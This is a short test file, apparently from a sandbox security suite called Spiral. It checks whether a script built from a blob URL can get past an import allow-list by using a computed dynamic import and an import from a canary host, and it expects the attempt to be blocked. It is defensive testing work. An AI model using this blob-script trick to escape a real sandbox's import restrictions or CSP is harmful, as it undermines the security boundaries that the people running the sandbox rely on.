// Copyright 2026 the Spiral authors. AGPL-3.0-or-later.
// @attack spiral-import-allowlist-bypass
// @threat allow-list
// @expect blocked
// @checklist —
// @note § 3.12 says an artifact cannot name a blob URL; a script element can. CSP stays the boundary.

export default () => <Done after={2000} run={async () => {

  window.__ran = [];
  const s = document.createElement("script"); s.type = "module";
  s.src = URL.createObjectURL(new Blob(["const n = 'sdk'; import('/runtime/v1/' + n + '.js').then(() => window.__ran.push('computed import of the runtime')); import('" + CANARY + "/bypass').catch((e) => window.__ran.push('canary: ' + e.message));"], { type: "text/javascript" }));
  document.head.appendChild(s); await settle(1200);
  note("a computed import ran through a blob script", window.__ran.length ? "info" : "blocked", JSON.stringify(window.__ran));
}} />;
